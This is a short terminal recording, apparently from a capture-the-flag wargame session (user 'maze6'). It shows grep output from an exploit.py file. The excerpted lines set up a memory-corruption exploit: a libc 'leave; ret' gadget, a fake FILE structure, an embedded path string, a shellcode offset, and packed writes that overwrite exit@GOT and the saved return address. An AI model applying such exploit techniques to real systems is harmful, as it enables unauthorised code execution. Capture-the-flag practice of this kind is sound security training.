[0.182, "o", "grep -n \"SC_OFF\\|FAKE_OFF\\|GADGET\\|PATH_OFF\" exploit.py\r\r\n\u001b[?2004l\r"]
[0.003, "o", "\u001b]3008;start=d2d3484d-9569-4501-a80a-75bcd29690cd;type=command;machineid=ec21caf08cfdfe937b9cee1512c61281;user=maze6;hostname=gibson-0;bootid=7b3c318e-e0a3-4e72-9221-931949256b86;pid=3;cwd=/run/screen/l6\u001b\\\u001b[32m\u001b[K28\u001b[m\u001b[K\u001b[36m\u001b[K:\u001b[m\u001b[K\u001b[01;31m\u001b[KGADGET\u001b[m\u001b[K_LEAVE_RET = LIBC + 0x1AF32E          # leave; ret\r\r\n\u001b[32m\u001b[K32\u001b[m\u001b[K\u001b[36m\u001b[K:\u001b[m\u001b[K\u001b[01;31m\u001b[KFAKE_OFF\u001b[m\u001b[K = 0x1E0                            # fake FILE inside buf (right after argv[])\r\r\n"]
[0.011, "o", "\u001b[32m\u001b[K33\u001b[m\u001b[K\u001b[36m\u001b[K:\u001b[m\u001b[K\u001b[01;31m\u001b[KPATH_OFF\u001b[m\u001b[K = 0x284                            # path string copy inside buf (NUL-terminated)\r\r\n\u001b[32m\u001b[K34\u001b[m\u001b[K\u001b[36m\u001b[K:\u001b[m\u001b[K\u001b[01;31m\u001b[KSC_OFF\u001b[m\u001b[K   = 0x2A0                            # shellcode inside buf (after the path copy)\r\r\n\u001b[32m\u001b[K55\u001b[m\u001b[K\u001b[36m\u001b[K:\u001b[m\u001b[K    fake = buf_addr + \u001b[01;31m\u001b[KFAKE_OFF\u001b[m\u001b[K\r\r\n\u001b[32m\u001b[K66\u001b[m\u001b[K\u001b[36m\u001b[K:\u001b[m\u001b[K    p[0:4] = struct.pack(\"<I\", \u001b[01;31m\u001b[KGADGET\u001b[m\u001b[K_LEAVE_RET)        # buf[0..4] -> exit@GOT\r\r\n\u001b[32m\u001b[K69\u001b[m\u001b[K\u001b[36m\u001b[K:\u001b[m\u001b[K    p += struct.pack(\"<I\", buf_addr + \u001b[01;31m\u001b[KSC_OFF\u001b[m\u001b[K)           # saved eip (pivot target)\r\r\n\u001b[32m\u001b[K75\u001b[m\u001b[K\u001b[36m\u001b[K:\u001b[m\u001b[K    p += struct.pack(\"<I\", buf_addr + \u001b[01;31m\u001b[KPATH_OFF\u001b[m\u001b[K)         # argv[1] -> path INSIDE payload\r\r\n\u001b[32m\u001b[K79\u001b[m\u001b[K\u001b[36m\u001b[K:\u001b[m\u001b[K    p += b\"C\" * (\u001b[01;31m\u001b[KPATH_OFF\u001b[m\u001b[K - len(p))\r\r\n\u001b[32m\u001b[K81\u001b[m\u001b[K\u001b[36m\u001b[K:\u001b[m\u001b[K    p += b\"C\" * (\u001b[01;31m\u001b[KSC_OFF\u001b[m\u001b[K - len(p))\r\r\n"]
[0.004, "o", "\u001b]3008;end=d2d3484d-9569-4501-a80a-75bcd29690cd;exit=success\u001b\\\u001b]3008;start=4c0d9a69-7559-4ebb-bfa7-eb9744cb908a;type=shell;machineid=ec21caf08cfdfe937b9cee1512c61281;user=maze6;hostname=gibson-0;bootid=7b3c318e-e0a3-4e72-9221-931949256b86;pid=3;cwd=/run/screen/l6\u001b\\\u001b[?2004h\u001b]0;maze6@maze: /run/screen/l6\u0007maze6@maze:/run/screen/l6$ "]
